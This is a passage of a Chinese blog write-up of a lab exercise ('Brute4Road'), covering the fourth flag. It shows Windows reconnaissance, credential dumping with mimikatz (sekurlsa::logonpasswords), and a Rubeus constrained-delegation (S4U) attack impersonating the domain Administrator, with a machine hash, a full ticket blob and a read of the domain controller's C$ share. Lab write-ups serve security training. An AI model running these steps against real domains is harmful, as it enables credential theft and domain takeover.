+<h2 id="flag-04"><a href="#flag-04" class="headerlink" title="flag-04"></a>flag-04</h2><p>win信息搜集一下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lanyangyang&gt;systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           MSSQLSERVER</span><br><span class="line">OS 名称:          Microsoft Windows Server 2016 Datacenter</span><br><span class="line">OS 版本:          10.0.14393 暂缺 Build 14393</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          成员服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:</span><br><span class="line">注册的组织:       Aliyun</span><br><span class="line">产品 ID:          00376-40000-00000-AA947</span><br><span class="line">初始安装日期:     2022/6/8, 16:30:01</span><br><span class="line">系统启动时间:     2026/2/12, 16:55:32</span><br><span class="line">系统制造商:       Alibaba Cloud</span><br><span class="line">系统型号:         Alibaba Cloud ECS</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz</span><br><span class="line">BIOS 版本:        SeaBIOS 449e491, 2014/4/1</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     3,950 MB</span><br><span class="line">可用的物理内存:   1,409 MB</span><br><span class="line">虚拟内存: 最大值: 4,654 MB</span><br><span class="line">虚拟内存: 可用:   1,018 MB</span><br><span class="line">虚拟内存: 使用中: 3,636 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               xiaorang.lab</span><br><span class="line">登录服务器:       \\MSSQLSERVER</span><br><span class="line">修补程序:         安装了 6 个修补程序。</span><br><span class="line">                  [01]: KB5013625</span><br><span class="line">                  [02]: KB4049065</span><br><span class="line">                  [03]: KB4486129</span><br><span class="line">                  [04]: KB4486131</span><br><span class="line">                  [05]: KB5014026</span><br><span class="line">                  [06]: KB5013952</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Red Hat VirtIO Ethernet Adapter</span><br><span class="line">                      连接名:      以太网</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: 172.22.255.253</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 172.22.2.16</span><br><span class="line">                        [02]: fe80::444e:2b2b:eb24:e70a</span><br><span class="line">Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212182151223.png"
+                      alt="image-20260212182151223"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提升权限 命令：privilege::debug</span><br><span class="line">提取登录凭据 命令 sekurlsa::logonpasswords//然后到后面我基本没有怎么懂，看他们一步步操作吧</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212190105153.png"
+                      alt="image-20260212190105153"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212190134310.png"
+                      alt="image-20260212190134310"
+                ></p>
+<p>看一下域渗透攻击路径分析图</p>
+<p>MSSQLSERVER 配置了到 DC LDAP 和 CIFS 服务的约束性委派，传个猕猴桃mimikatz.exe上去并用管理员身份运行</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob:https://github.com/75f6af11-50ab-4ea5-a43d-4fe006cbdc89</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提升权限 命令：privilege::debug</span><br><span class="line">提取登录凭据 命令 sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212183030069.png"
+                      alt="image-20260212183030069"
+                ></p>
+<h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>MSSQLSERVER 配置了到 DC LDAP 和 CIFS 服务的约束性委派，用Rubeus申请自身的服务票据，用通过 S4U 伪造 ST</p>
+<p>首先用Rubeus.exe申请自身的服务票据&#x2F;&#x2F;这个工具得自己去编译</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:4250ef4c15bfeb685371970e1be00b85 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure></div>
+
+<p>得到票据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212190436595.png"
+                      alt="image-20260212190436595"
+                ></p>
+<p>注入票据</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE1btfneTGYuYI+fnwsBbpz9d80968QVyp/krgzq88XpZdXIydeuCa0Ox+Y2XeHdywDbZ8TEC2/PPQ7XTj4xkQ5Se/iY6tlhKKUozG8T0y0+6E1YQzAlDsB0qCPdg5V4sptRaK/mD+K8x3lr6IOUAZLPdngf4yW+zPleZWKLoVpWiDE9GNh+1h6XLacLFanztFoaB/yTetP2GuqJ0U2edNPwYVgn+K3y4klqfjQnpAxA61vQrgQSD2Rcl4JqRSVFUary3JKF+Pf7IMXApZGz25NqmPyTMkfBXlLFDr/DuQzh+3Fd2yxCtvw6MOzZwREQ9SKQVFGg8VesAOkVXQd9twFD7mU8wWYnryqHjJUc+B/VD/MCl2mYbpm7UdVHOLtIY52dP613S7bnol7R8E+MvmFbsRsRFQbl7OCzTPtYdDXMMXWtQydVIgmaVQk1EQlQ4KYCpLpaYrTzvtg841iO66Zt2zM97K0mpGVQBX+KRun8+0QIsdynifLvMtFnFE+MkjePEhvGAa6YkZhH0XlNtRUA4caXBg+KNr0/Cgr/h9xOcDXIJA40+E5XS0/NjOKNHKIlZs3Nf9g0D5CI5vEncQisucBDp0fmVVylY1oMFzwhStWRszTwtQ+tax1GMjmM8UewFxLcxmhn6nBVQMkLkJ5vaQbSz+8Ko9ldCpEV3ShDi/w02lMGxJFfwQeTqWquFlhFuR506yOHlX6sQPIq7Q2R4LNLoDcHRFr+xs826u7Xa/cKLtCrSQor2bLQs7nWVuVJRsCx5m2UKalffwWxowhSoPEnoNyI+GM7t59LI7qud+Q8bfb9VH+/2QpHzuY2SOlojbi4jl8gwoxvdMTUAZuJZBWsRZHwELmIMSJ6rcYbri5cdYHGpYVR6gA0UyhDtZrL5AUSHIg8xEwBoHxaI70OTi1RZl/q+F1rMdW+7tbrd+JGHSlx917zEbepDn95m0OyqFNhwOUU59HU57VuAN7HCAlG1RqMHaXC2KihJNjlu2TU3zjhi08lAE3k3J+91FXAWE/AkCaMj1R2yH5OmhQQWLOTm8RMsphOSqupoiwTs4Gmmg6WPZHMBabGwUCdzsFkLeHHCrONIosnn7ifo8u/o+cSKCo1R+zKK4eD1dvudnsfdShHzNEFgkhVahkKwRzZMnzQ77pL5hHOSUg/5GEv10eXvi+ktWq9AhYIBJ/6FP1P9GarT+6sM3X/Vpdy1GeRVBrMYRVJ20iZ5/RqkLb2oEvBaa74gPsD9DntAff3R/MgAt7130GeixmR5giywd+SrGjsweO+uR8iiRR9cxe6/TirkN4BdQMder7dYavEc8q0X7drdebDB4XgG9sY9+YkSsudo2pZHnHKEykga6iqoAS66BoxObyGtfn2QamjUARvD8n4bJGUTC8ed1yclN7P8M9Zgth77CpuVVYpnuR7+cNoPBSwALDQ55PMLa9gQoC83vzKbVvSr5dE/fqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBAIogDroed1KhPlRRifj/AboQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDIxMzE2MjQ1MlqmERgPMjAyNDAyMTQwMjI0NTJapxEYDzIwMjQwMjIwMTYyNDUyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure></div>
+
+<p>读取flag</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212190532789.png"
+                      alt="image-20260212190532789"
+                ></p>
+<p>拿下flag（其实并非拿下，因为我没编译，04都是偷的图哈哈哈哈）</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Brute4Road春秋云镜</li>
+        <li><strong>作者:</strong> wea5e1</li>
+        <li><strong>创建于
+                :</strong> 2026-02-12 21:33:24</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-02-14 11:58:43
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://hxl-lcm.github.io/2026/02/12/Brute4Road春秋云镜/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/02/08/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ctfshow-java反序列化</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">Brute4Road春秋云镜</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Brute4Road%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C"><span class="nav-text">Brute4Road春秋云镜</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-01"><span class="nav-text">flag-01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-02"><span class="nav-text">flag-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-03"><span class="nav-text">flag-03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-04"><span class="nav-text">flag-04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-text">约束委派攻击</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">wea5e1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 8 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
